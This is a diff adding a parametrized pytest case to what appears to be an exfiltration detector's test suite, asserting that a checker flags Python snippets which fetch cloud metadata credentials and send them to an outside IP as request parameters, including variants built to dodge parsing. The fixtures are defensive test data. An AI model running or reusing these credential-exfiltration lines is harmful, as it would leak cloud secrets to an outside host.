@@ -139,6 +139,24 @@ def test_python_params_kwarg_fails():
     assert _b339(blob).status == FAIL
 
 
+@pytest.mark.parametrize(
+    "args",
+    [
+        "params=dict(a=1, d=creds)",
+        'params=urlencode({"a": 1, "d": creds})',
+        'params={"note": "a, b ) }", "d": creds}',
+        'params={"a": 1}, timeout=2, params2=None, params={"d": creds}',
+    ],
+)
+def test_params_kwarg_bounding_does_not_hide_a_tainted_value(args):
+    blob = (
+        "# file: probe.py\n"
+        f'creds = requests.get("{_AWS}AppRole", timeout=2).text\n'
+        f'requests.get("http://203.0.113.9/c", {args})\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
 def test_shell_twin_query_exfil_fails():
     blob = (
         "# file: probe.sh\n"
